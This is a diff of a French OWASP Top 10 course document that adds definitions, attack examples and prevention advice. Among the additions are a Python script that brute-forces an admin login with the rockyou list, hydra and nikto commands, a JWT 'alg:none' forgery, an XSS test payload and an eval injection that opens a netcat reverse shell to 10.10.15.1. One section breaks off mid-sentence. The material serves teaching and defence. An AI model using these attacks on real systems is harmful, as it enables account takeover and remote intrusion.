@@ -1,5 +1,10 @@
 # Injection SQL
 
+### Définition
+
+Des failles d'injection, telles que l'injection SQL, NoSQL, OS et LDAP, se produisent lorsque l'attaquant envoie des données à un interpréteur dans le cadre d'une commande ou d'une requête. 
+l'injection de l'attaquant peux inciter à exécuter des commandes involontaires ou à accéder aux données sans autorisation appropriée.
+
 - **Agents de menace / vecteurs d'attaque** : On peut supposer que presque toutes les sources de données peuvent être un vecteur d'injection comme des variables d'environnement, des paramètres, des services Web externes et internes et tous les types d'utilisateurs. Les failles d'injection se produisent lorsqu'un attaquant veut envoyer des données malveillante à un interpréteur SQL.
 
 - **Faille de sécurité** : les failles d'injection sont très répandues, en particulier dans le code hérité. Les vulnérabilités d'injection se trouvent souvent dans les requêtes SQL, LDAP, XPath ou NoSQL, les commandes du système d'exploitation, les analyseurs XML, les en-têtes SMTP, les langages d'expression ou encore les requêtes ORM. Les scanners et les fuzzers peuvent aider les attaquants à trouver des défauts d'injection.
@@ -56,9 +61,22 @@ L'injection SQL basée sur l'Union est une technique d'injection qui exploite l'
 
 IMAGE ExempleUnion
 
+### Prévention
+
+La prévention de l'injection nécessite de conserver les données distinctes des commandes et des requêtes.
+
+- L'option préférée consiste à utiliser une API sûre, qui évite l'utilisation complète de l'interpréteur ou fournit une interface paramétrée, ou à migrer pour utiliser les outils de mappage relationnel objet. 
+- Utilisez une validation d'entrée côté serveur positive ou «liste blanche». Ce n'est pas une défense complète car de nombreuses applications nécessitent des caractères spéciaux, tels que des zones de texte ou des API pour les applications mobiles.
+- Pour toute requête dynamique résiduelle, filtrez les caractères spéciaux en utilisant la syntaxe spécifique pour chaque interpréteur. 
+- Utilisez LIMIT et d'autres contrôles SQL dans les requêtes pour empêcher la divulgation massive des enregistrements en cas d'injection SQL.
+
 
 
 # Broken Authentification
+
+### Définition
+
+Les fonctions d'application liées à l'authentification et à la gestion de session sont souvent implémentées de manière incorrecte, permettant aux attaquants de compromettre les mots de passe, les jetons de session, ou d'exploiter d'autres failles d'implémentation pour assuré l'identité des autres utilisateurs de manière temporaire ou permanente.
 
 - **Agents de menace / vecteurs d'attaque** : les attaquants ont accès à des centaines de millions de combinaisons de nom d'utilisateur et de mot de passe valides pour le bourrage des informations d'identification, les listes de comptes administratifs par défaut on appelle sa un "dictionnaire". Les attaques de gestion de session sont bien réel, en particulier en ce qui concerne les jetons de session non expirés.
 - **Faille de sécurité** : La prévalence de l'authentification rompue est répandue en raison de la conception et de la mise en œuvre de la plupart des contrôles d'identité et d'accès. La gestion de session est le fondement des contrôles d'authentification et d'accès et est présente dans toutes les applications avec état. Les attaquants peuvent détecter une authentification rompue à l'aide de moyens manuels et les exploiter à l'aide d'outils automatisés avec des listes de mots de passe et des attaques par dictionnaire.
@@ -86,19 +104,61 @@ La confirmation de l'identité, de l'authentification et de la gestion de sessio
 
 L'attaquant va alors utiliser pour la plus part du temps un outils, ou un script permettant l'utilisation d'un dictionnaire ou non et lancer plusieurs requêtes jusqu'à deviner le mot de passe
 
+Sur un formulaire d'authentification, on peut utiliser comme outils "nikto" qui à une fonctionnalité de testé en bruteforce certain couple de mot de passe 
+
+- nikto -h www.leformulaire.com
+
+Pour le SSH on peut par exemple utiliser "hydra"
+
+- hydra -l root -P "dico" -s 22 -f "IPduServeurSSH" ssh
+
+On peut aussi utiliser des scripts personnalisés pour attaquer un formulaire login/password.
+
+Prenons l'exemple d'un site web, on imagine que l'utilisateur que l'on souhaite pirater est "admin", on ne connait pas sont mot de passe. Ce script, permet l'utilisation d'un bibliothèque connus, ici, rockyou pour testé chaque couple admin/motdepasse, on utiliseras python ainsi que la librairie "request"
+
+```
+#!/usr/bin/python
+
+import requests
+import re
+
+f = open("rockyou-75.txt","r").read().split('\n')
+compteur = 0
+
+for i in f:
+	session = requests.Session()
+	r = session.get('http://lesite.com')
+	data = {
+        	 "useralias" : "admin",
+        	 "password" :  i,
+        	 }
+	url = "http://lesite.com"
+	r = session.post(url,data=data)
+	if "MauvaisMdp." in r.text:
+		print str(compteur) + '\r'
+		compteur+=1
+	else:
+		print "BonMdp: " + i
+		exit()
+```
+
 IMAGE ExempleBruteForce
 
+### Prévention
 
-
-**Attaque 2 : Vol de cookie**
-
-L'attaquant peut, utiliser par exemple une attaque CSRF sur un utilisateur, en volant sont cookie, il peut usurper l'identité de l'utilisateur sur le serveur et ainsi accéder à des informations non autorisée.
-
-IMAGE ExempleVolCookie 
+- Dans la mesure du possible, implémentez l'authentification multifacteur pour empêcher les attaques automatisées de bourrage d'informations d'identification, de force brute et de réutilisation des informations d'identification volées.
+- Implémentez des vérifications de mots de passe faibles, telles que le test de mots de passe nouveaux ou modifiés par rapport à une liste des 10000 mots de passe les plus faible.
+- Assurez-vous que les chemins d'enregistrement, de récupération des informations d'identification et d'API sont renforcés contre les attaques d'énumération de compte en utilisant les mêmes messages pour tous les résultats.
+- Limitez ou retardez de plus en plus les tentatives de connexion infructueuses. Consignez toutes les pannes et alertez les administrateurs lorsque le bourrage d'informations d'identification, la force brute ou d'autres attaques sont détectés.
+- Utilisez un gestionnaire de session intégré et sécurisé côté serveur qui génère un nouvel ID de session aléatoire avec une entropie élevée après la connexion. Les ID de session ne doivent pas figurer dans l'URL, être stockés de manière sécurisée et invalidés après déconnexion, inactivité et délais d'expiration.
 
 
 
 # Sensitive Data Exposure
+
+### Définition
+
+De nombreuses applications Web et API ne protègent pas correctement les données sensibles. Les attaquants peuvent voler ou modifier ces données faiblement protégées pour commettre une fraude par carte de crédit, un vol d'identité ou d'autres délits, souvent ces données ne sont pas chiffrées ou chiffrées avec un algorithme de chiffrement faible.
 
 - **Agents de menace / vecteurs d'attaque** : plutôt que d'attaquer directement la crypto, les attaquants volent des clés, exécutent des attaques de type intermédiaire ou volent des données en texte clair sur le serveur, pendant le transport, ou sur le client de l'utilisateur, par exemple un navigateur. Une attaque manuelle est généralement requise. Les bases de données de mots de passe précédemment récupérées peuvent être forcées par les unités de traitement graphique (GPU).
 - **Faiblesses en matière de sécurité** : au cours des dernières années, il s'agit de l'attaque ayant le plus d'impact. Le défaut le plus courant est tout simplement de ne pas crypter les données sensibles. Lorsque la cryptographie est utilisée, la génération et la gestion de clés faibles et l'utilisation faible d'algorithmes, de protocoles et de chiffrement sont courantes, en particulier pour les techniques de stockage de hachage de mots de passe faibles. Pour les données en transit, les faiblesses côté serveur sont principalement faciles à détecter, mais difficiles pour les données au repos.
@@ -128,9 +188,27 @@ Ici, l'utilisateur va ce connecter au FTP avec une communication non chiffré, i
 
 IMAGE ExempleMITM
 
+### Prévention
+
+Procédez au minimum comme suit et consultez les références:
+
+- Classer les données traitées, stockées ou transmises par une application. Identifiez les données sensibles en fonction des lois sur la confidentialité, des exigences réglementaires ou des besoins de l'entreprise.
+- Appliquer des contrôles selon la classification.
+- Ne stockez pas inutilement des données sensibles. Jetez-le dès que possible.
+- Assurez-vous de chiffrer toutes les données sensibles.
+- Assurez-vous que des algorithmes, protocoles et clés standard à jour et solides sont en place; utiliser une bonne gestion des clés.
+- chiffrez toutes les données en transit avec des protocoles sécurisés tels que TLS avec des chiffrements PFS (Perfect Forward Secret), une hiérarchisation des chiffrements par le serveur et des paramètres sécurisés.
+- Désactivez la mise en cache pour les réponses contenant des données sensibles.
+- Stockez les mots de passe à l'aide de fonctions de hachage adaptatives et salées.
+- Vérifiez indépendamment l'efficacité de la configuration et des paramètres.
+
 
 
 # XML External Entities (XXE)
+
+### Définition
+
+Une attaque d'entité externe XML est un type d'attaque contre une application qui analyse une entrée XML. Cette attaque se produit lorsque l'entrée XML contenant une référence à une entité externe est traitée par un analyseur XML faiblement configuré. Cette attaque peut entraîner la divulgation de données confidentielles, un déni de service, la falsification de requêtes côté serveur, la numérisation de port du point de vue de la machine sur laquelle se trouve l'analyseur et d'autres répercussions sur le système.
 
 - **Agents de menace / vecteurs d'attaque** : les attaquants peuvent exploiter des processeurs XML vulnérables s'ils peuvent télécharger du XML ou inclure du contenu hostile dans un document XML, en exploitant du code vulnérable, des dépendances ou des intégrations.
 - **Faille de sécurité** : par défaut, de nombreux processeurs XML plus anciens autorisent la spécification d'une entité externe, un URI qui est déréférencé et évalué pendant le traitement XML. Les outils DAST peuvent découvrir ce problème en inspectant les dépendances et la configuration. Les outils DAST nécessitent des étapes manuelles supplémentaires pour détecter et exploiter ce problème. Les testeurs manuels doivent être formés à la façon de tester XXE, car il n'était pas couramment testé en 2017.
@@ -150,7 +228,7 @@ Les applications et en particulier les services Web basés sur XML ou les intég
 
   
 
-**Attaque 2 : XEE**
+**Attaque 2 : XXE**
 
 Une attaque d' entité externe XML est un type d'attaque contre une application qui analyse une entrée XML. Cette attaque se produit lorsque l' entrée XML contenant une référence à une entité externe est traitée par un analyseur XML faiblement configuré . 
 
@@ -158,9 +236,25 @@ Cette attaque peut entraîner la divulgation de données confidentielles, un dé
 
 IMAGE ExempleXEE
 
+### Prévention
+
+La formation des développeurs est essentielle pour identifier et atténuer XXE. De plus, la prévention de XXE nécessite:
+
+- Dans la mesure du possible, utilisez des formats de données moins complexes tels que JSON et évitez la sérialisation des données sensibles.
+- Corrigez ou mettez à niveau tous les processeurs et bibliothèques XML utilisés par l'application ou sur le système d'exploitation sous-jacent. Utilisez des vérificateurs de dépendances.
+- Désactivez l'entité externe XML et le traitement DTD dans tous les analyseurs XML de l'application.
+- Mettez en œuvre une validation, un filtrage ou un filtrage des entrées côté serveur positif («liste blanche») pour empêcher les données hostiles dans les documents XML, les en-têtes ou les nœuds.
+- Vérifiez que la fonctionnalité de téléchargement de fichiers XML ou XSL valide le XML entrant à l'aide de la validation XSD ou similaire.
+
+Si ces contrôles ne sont pas possibles, envisagez d'utiliser des correctifs virtuels, des passerelles de sécurité API ou des pare-feu d'applications Web (WAF) pour détecter, surveiller et bloquer les attaques XXE.
+
 
 
 # Broken Access Control
+
+### Définition
+
+Les restrictions sur ce que les utilisateurs authentifiés sont autorisés à faire ne sont souvent pas correctement appliquées. Les attaquants peuvent exploiter ces failles pour accéder à des fonctionnalités et/ou des données non autorisées, comme accéder aux comptes d'autres utilisateurs, afficher des fichiers sensibles, modifier les données d'autres utilisateurs, changer les droits d'accès, etc...
 
 - **Agents de menace / vecteurs d'attaque** : l'exploitation du contrôle d'accès est une compétence essentielle des attaquants. Les outils SAST et DAST peuvent détecter l'absence de contrôle d'accès mais ne peuvent pas vérifier s'il est fonctionnel lorsqu'il est présent. Le contrôle d'accès est détectable à l'aide de moyens manuels, ou éventuellement grâce à l'automatisation pour l'absence de contrôles d'accès dans certains cadres.
 - **Faiblesse de sécurité** : les faiblesses du contrôle d'accès sont fréquentes en raison du manque de détection automatisée et du manque de tests fonctionnels efficaces par les développeurs d'applications. La détection du contrôle d'accès ne se prête généralement pas à des tests statiques ou dynamiques automatisés. Les tests manuels sont le meilleur moyen de détecter les contrôles d'accès manquants ou inefficaces, y compris la méthode HTTP (GET vs PUT, etc.), le contrôleur, les références d'objet directes, etc.
@@ -183,13 +277,52 @@ Le contrôle d'accès applique une stratégie telle que les utilisateurs ne peuv
 
 **Attaque 1 : JSON Web Token (JWT)**
 
-JSON Web Token permet l'échange sécurisé de jetons entre plusieurs parties cependant, on peut usurper un token ou encore trompé la vérification de la signature ou encore déchiffré des "secrets" facilement avec des dictionnaires.
+JSON Web token permet l'échange sécurisé de jetons entre plusieurs parties cependant, on peut usurper un token ou encore trompé la vérification de la signature ou encore déchiffré des "secrets" facilement avec des dictionnaires.
+
+Un JSON Web token est construis en 3 parties.
+
+- Il est composé de 3 parties : le header, le payload et la signature.
+- Il sont séparés par des points dans la chaine de caractères et les informations sont encodées en base64.
+
+On peut voir les tokens si l'on inspecte la page dans la partie "network", un exemple d'un TOKEN.
+
+*eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk*
+
+Si l'on décode chaque partie cela donne :
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 = {"typ":"JWT","alg":"HS256"}
+
+eyJ1c2VybmFtZSI6Imd1ZXN0In0 = {"username":"guest"}
+
+**Cette partie est la signature.**
+
+OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk = :{z WF'ڳz>w
+
+Seulement voilà, on peut tromper la vérification via signature en indiquant dans le header que l’on utilise pas d’algorithme de signature.
+
+On change de {"username":"guest"} à {"username":"admin"} pour être en admin, on supprime l'algorithme pour la signature: {"typ":"JWT","alg":"none"} et on retire la signature, on renvoie notre payload et PAF, nous sommes admin.
 
 IMAGE ExempleTOKEN
+
+### Prévention
+
+Le contrôle d'accès n'est efficace que s'il est appliqué dans du code côté serveur approuvé ou une API sans serveur, où l'attaquant ne peut pas modifier la vérification du contrôle d'accès ou les métadonnées.
+
+- À l'exception des ressources publiques, refusez par défaut.
+- Implémentez une fois les mécanismes de contrôle d'accès et réutilisez-les tout au long de l'application, notamment en minimisant l'utilisation de CORS.
+- Les contrôles d'accès aux modèles doivent imposer la propriété des enregistrements, plutôt que d'accepter que l'utilisateur puisse créer, lire, mettre à jour ou supprimer n'importe quel enregistrement.
+- Désactivez la liste des répertoires du serveur Web et assurez-vous que les métadonnées des fichiers (par exemple .git) et les fichiers de sauvegarde ne sont pas présents dans les racines Web.
+- Enregistrer les échecs de contrôle d'accès, alerter les administrateurs le cas échéant (par exemple, échecs répétés).
+- Limitez l'accès à l'API et au contrôleur pour minimiser les dommages causés par les outils d'attaque automatisés.
+- Les jetons JWT doivent être invalidés sur le serveur après la déconnexion.
 
 
 
 # Security Misconfiguration
+
+### Définition
+
+Une mauvaise configuration de la sécurité est le problème le plus courant. Cela est généralement le résultat de configurations par défaut non sécurisées, de configurations incomplètes, d'en-têtes HTTP mal configurés et de messages d'erreur détaillés contenant des informations sensibles. Non seulement tous les systèmes d'exploitation, bibliothèques et applications doivent être configurés en toute sécurité, mais ils doivent être corrigés / mis à niveau en temps opportun.
 
 - **Agents de menace / vecteurs d'attaque** : les attaquants tentent souvent d'exploiter des failles non corrigées ou d'accéder à des comptes par défaut, à des pages inutilisées, à des fichiers et répertoires non protégés, etc. pour obtenir un accès non autorisé ou une connaissance du système.
 - **Faiblesse de sécurité** : une mauvaise configuration de la sécurité peut se produire à n'importe quel niveau d'une pile d'applications, y compris les services réseau, la plate-forme, le serveur Web, le serveur d'applications, la base de données, les cadres, le code personnalisé et les machines virtuelles, conteneurs ou stockage préinstallés. Les scanners automatisés sont utiles pour détecter les erreurs de configuration, l'utilisation de comptes ou de configurations par défaut, les services inutiles, les options héritées, etc.
@@ -211,13 +344,28 @@ L'application peut être vulnérable si l'application est:
 
 **Attaque 1 : Insecure Code Management**
 
-Certain site web laisse parfois des accès a des informations sensible sans comprendre la cause.
+Certain site web laisse parfois des accès a des informations sensible, un exemple avec le .git
 
-Par Exemple, avec 
+On remarque sur un site web que l'administrateur à laisser u
+
+### Prévention
+
+Des processus d'installation sécurisés doivent être mis en œuvre, notamment:
+
+- Un processus de durcissement reproductible qui permet de déployer rapidement et facilement un autre environnement correctement verrouillé. Les environnements de développement, d'assurance qualité et de production doivent tous être configurés de manière identique, avec des informations d'identification différentes utilisées dans chaque environnement. Ce processus doit être automatisé afin de minimiser l'effort requis pour configurer un nouvel environnement sécurisé.
+- Une plate-forme minimale sans fonctionnalités, composants, documentation et exemples inutiles. Supprimez ou n'installez pas les fonctionnalités et les cadres inutilisés.
+- Une tâche pour examiner et mettre à jour les configurations appropriées à toutes les notes de sécurité, mises à jour et correctifs dans le cadre du processus de gestion des correctifs.
+- Une architecture d'application segmentée qui fournit une séparation efficace et sécurisée entre les composants ou les locataires, avec segmentation, conteneurisation ou groupes de sécurité cloud (ACL).
+- Envoi de directives de sécurité aux clients
+- Un processus automatisé pour vérifier l'efficacité des configurations et des paramètres dans tous les environnements.
 
 
 
 # Cross-Site Scripting (XSS)
+
+### Définition
+
+Des failles XSS inclut des données non autorisés dans une page Web, ou met à jour une page Web existante avec des données fournies par l'attaquant. XSS permet en autres aux attaquants d'exécuter des scripts dans le navigateur de la victime qui peuvent pirater des sessions utilisateur, défigurer des sites Web ou rediriger l'utilisateur vers des sites malveillants.
 
 - **Agents de menace / vecteurs d'attaque** : des outils automatisés peuvent détecter et exploiter les trois formes de XSS, et il existe des cadres d'exploitation librement disponibles.
 - **Faille de sécurité** : XSS est le deuxième problème le plus répandu dans le Top 10 OWASP, et se trouve dans environ les deux tiers de toutes les applications. Les outils automatisés peuvent détecter automatiquement certains problèmes XSS, en particulier dans les technologies matures telles que PHP, J2EE / JSP et ASP.NET.
@@ -237,11 +385,34 @@ Il existe trois formes de XSS, ciblant généralement les navigateurs des utilis
 
 Le cross-site scripting (XSS ) permet d'injecter du contenu dans une page web, provoquant ainsi des actions sur malveillante sur les utilisateurs visitant la page, vol de cookie, redirection vers un site malveillant, défaçage.
 
+Pour tester si une faille XSS existe, la manière la plus simple est d’injecter un code javascript. Le test le plus élémentaire à réaliser est de l’injection soit dans une URL, soit dans un formulaire de contact, dans un livre d’or, etc ..
+
+Cette commande permet de voir si le site est faillible à du XSS elle est à retenir 
+
+- <script>alert(1)</script>
+
+Si lorsque j’envoie mon script Javascript, une pop-up apparait. la faille est bien présente dans le formulaire.
+
+Ensuite je dois construire ma XSS pour récupéré un cookie ou faire une redirection vers un site malveillant.
+
 IMAGE ExempleXSS
+
+### Prévention
+
+La prévention de XSS nécessite la séparation des données non fiables du contenu du navigateur actif. Cela peut être réalisé par:
+
+- Utilisation de frameworks qui échappent automatiquement à XSS par conception, tels que le dernier Ruby on Rails, React JS. Découvrez les limites de la protection XSS de chaque framework et gérez correctement les cas d'utilisation qui ne sont pas couverts.
+- L'échappement de données de requête HTTP non fiables en fonction du contexte dans la sortie HTML (corps, attribut, JavaScript, CSS ou URL) résoudra les vulnérabilités XSS reflétées et stockées.
+- L'application d'un encodage contextuel lors de la modification du document du navigateur côté client agit contre DOM XSS. Lorsque cela ne peut être évité, des techniques d'échappement contextuelles similaires peuvent être appliquées aux API du navigateur.
+- Utiliser la fonction`htmlspecialchars()` . Cette fonction permet de filtrer les symboles du type <, & ou encore ", en les remplaçant par leur équivalent en HTML.
 
 
 
 # Insecure Deserialization
+
+### Définition
+
+Une désérialisation non sécurisée conduit souvent à l'exécution de code à distance. Même si les failles de désérialisation n'entraînent pas l'exécution de code à distance, elles peuvent être utilisées pour effectuer des attaques, notamment des attaques de relecture, des attaques par injection et des attaques par escalade de privilèges
 
 - **Agents de menace / vecteurs d'attaque** : l'exploitation de la désérialisation est quelque peu difficile, car les exploits standard fonctionnent rarement sans modifications ou ajustements du code d'exploitation sous-jacent.
 - **Faille de sécurité** : ce problème est inclus dans le Top 10 sur la base d'une enquête de l'industrie et non sur des données quantifiables. Certains outils peuvent détecter des failles de désérialisation, mais une assistance humaine est souvent nécessaire pour valider le problème. On s'attend à ce que les données de prévalence des défauts de désérialisation augmentent à mesure que des outils sont développés pour aider à les identifier et à y remédier.
@@ -268,9 +439,24 @@ La sérialisation peut être utilisée dans des applications pour:
 
 - Cookies HTTP, paramètres de formulaire HTML, jetons d'authentification API
 
+  ### Prévention
+  
+  Le seul modèle architectural sûr est de ne pas accepter les objets sérialisés provenant de sources non fiables ou d'utiliser des supports de sérialisation qui n'autorisent que les types de données primitifs. Si cela n'est pas possible, envisagez l'une des options suivantes:
+  
+  - Implémentation de contrôles d'intégrité tels que des signatures numériques sur tous les objets sérialisés pour empêcher la création d'objets hostiles ou la falsification de données.
+  - Application de contraintes de type strictes pendant la désérialisation avant la création de l'objet, car le code attend généralement un ensemble définissable de classes. Les contournements de cette technique ont été démontrés, il est donc déconseillé de s'en remettre uniquement à cette technique.
+  - Isoler et exécuter du code qui désérialise dans les environnements à faibles privilèges lorsque cela est possible.
+  - Consigner les exceptions et les échecs de désérialisation, par exemple lorsque le type entrant n'est pas le type attendu ou que la désérialisation lève des exceptions.
+  - Restreindre ou surveiller la connectivité réseau entrante et sortante à partir de conteneurs ou de serveurs qui se désérialisent.
+  - Surveillance de la désérialisation, alerte si un utilisateur se désérialise en permanence.
+  
   
 
 # Using Components with Known Vulnerabilities
+
+### Définition
+
+Les composants, tels que les bibliothèques, les Framework et autres modules logiciels, s'exécutent avec les mêmes privilèges que l'application. Si un composant vulnérable est exploité, une telle attaque peut faciliter une grave perte de données ou une prise de contrôle du serveur. Les applications et les API utilisant des composants présentant des vulnérabilités connues peuvent saper les défenses des applications et permettre diverses attaques et impacts.
 
 - **Agents de menace / vecteurs d'attaque** : bien qu'il soit facile de trouver des exploits déjà écrits pour de nombreuses vulnérabilités connues, d'autres vulnérabilités nécessitent des efforts concentrés pour développer un exploit personnalisé.
 - **Faille de sécurité** : la prévalence de ce problème est très répandue. Les modèles de développement à forte composante peuvent conduire les équipes de développement à ne même pas comprendre quels composants elles utilisent dans leur application ou API, et encore moins à les maintenir à jour. Certains scanners comme retire.js aident à la détection, mais la détermination de l'exploitabilité nécessite des efforts supplémentaires.
@@ -293,8 +479,62 @@ Vous êtes probablement vulnérable:
 - Si les développeurs de logiciels ne testent pas la compatibilité des bibliothèques mises à jour, mises à niveau ou corrigées.
 
   
+  
+  **Attaque 1**
+  
+  Nous avons un site web pour vendre des vêtements.
+  
+  Ce site web utilise une API en ligne de commande programmé en python pour pouvoir rapidement voir les stocks de l'entreprise quand on est pas dans les locaux ainsi que modifié quand on possède les droits nécessaires ou tout autre action.
+  
+  Cet API fonctionne notamment avec la commande **curl** comme ceci :
+  
+  ```
+  curl -X POST 'https://monsitedevetement.com/api/gerer_sotck/set' --data '{\"name\":\"t-shirt\",\"brand\":\"zara\",\"stock\":\"10\"}' 
+  ```
+  
+  Cette commande permet de mettre le stock de t-shirt de la marque Zara à 10 unités.
+  
+  Ces paramètres seront traité dans le programme suivant :
+  
+  ```
+  def handlePOST(request):
+      data = request.POST
+      if eval("data['stock']>=0"):
+          self.stock = data['stock']
+      else:
+          raise Exception("Negative stock")
+  ```
+  
+  On peut voir ici que nous passons un paramètre donnée par l'utilisateur à la fonction **eval** qui est risque dans ces conditions.
+  
+  Un attaquant ayant connaissance de cela par n'importe quel moyen peux très bien exploité cette vulnérabilités pour récupéré un Shell sur la machine par une commande de ce genre la :
+  
+  ```
+  "__import__(\'os\').system(\'rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.15.1 8123 > f\') "
+  ```
+  
+  Partant de la, c'est porte ouverte pour récupéré le total accès de la machine.
+  
+  
+  
+  ### Prévention
+  
+  Un processus de gestion des correctifs doit être en place pour:
+  
+  - Supprimez les dépendances inutilisées, les fonctionnalités inutiles, les composants, les fichiers et la documentation.
+  - Inventoriez en continu les versions des composants côté client et côté serveur (par exemple les frameworks, les bibliothèques) et leurs dépendances à l'aide d'outils tels que les versions, etc. Surveillez en permanence les sources comme CVE pour détecter les vulnérabilités des composants. Utilisez des outils d'analyse de composition logicielle pour automatiser le processus. Abonnez-vous aux alertes par e-mail pour les failles de sécurité liées aux composants que vous utilisez.
+  - Obtenez uniquement des composants de sources officielles via des liens sécurisés. Préférez les packages signés pour réduire les risques d'inclusion d'un composant malveillant modifié.
+  - Surveillez les bibliothèques et les composants qui ne sont pas gérés ou qui ne créent pas de correctifs de sécurité pour les anciennes versions. Si l'application de correctifs n'est pas possible, envisagez de déployer un correctif visuel pour surveiller, détecter ou protéger contre le problème découvert.
+  
+  Chaque organisation doit s'assurer qu'il existe un plan continu de surveillance, de tri et d'application des mises à jour ou des changements de configuration pour la durée de vie de l'application ou du portefeuille.
+  
+  
 
 # Insufficient Logging & Monitoring
+
+### Définition
+
+Le manque surveillance de tous les évènements liée a l'ordinateurs, comme les connections interne/externe, les erreurs d'exécution de programmes ou des journaux alias "log" peut amener un Hacker à continuer à attaquer un système informatique, de maintenir une persistance, et de falsifier, extraire ou détruire des données.
 
 - **Agents de menace / vecteurs d'attaque** : l'exploitation d'une journalisation et d'une surveillance insuffisantes est le fondement de presque tous les incidents majeurs. Les attaquants comptent sur le manque de surveillance et de réponse rapide pour atteindre leurs objectifs sans être détectés.
 - **Faille de sécurité** : ce problème est inclus dans le Top 10 sur la base d'une enquête de l'industrie . Une stratégie pour déterminer si vous disposez d'une surveillance suffisante consiste à examiner les journaux après les tests de pénétration. Les actions des testeurs doivent être enregistrées suffisamment pour comprendre quels dommages ils peuvent avoir infligés.
@@ -313,4 +553,14 @@ L'enregistrement, la détection, la surveillance et la réponse active insuffisa
 - Les seuils d'alerte et les processus d'escalade des réponses appropriés ne sont pas en place ni efficaces.
 - Les tests de pénétration et les analyses par les outils DAST ne déclenchent pas d'alertes.
 - L'application n'est pas en mesure de détecter, d'intensifier ou d'alerter les attaques actives en temps réel ou presque en temps réel.
+
+### Prévention
+
+Selon le risque des données stockées ou traitées par l'application:
+
+- Assurez-vous que tous les échecs de connexion, de contrôle d'accès et de validation des entrées côté serveur peuvent être enregistrés avec un contexte utilisateur suffisant pour identifier les comptes suspects ou malveillants, et conservés pendant suffisamment de temps pour permettre une analyse judiciaire différée.
+- Assurez-vous que les journaux sont générés dans un format qui peut être facilement consommé par une solution de gestion centralisée des journaux.
+- Assurez-vous que les transactions de grande valeur ont une piste d'audit avec des contrôles d'intégrité pour empêcher la falsification ou la suppression, telles que les tables de base de données à ajouter uniquement ou similaires.
+- Établir une surveillance et des alertes efficaces de sorte que les activités suspectes soient détectées et traitées en temps opportun.
+- Établir ou adopter un plan de réponse et de reprise après incident.
 
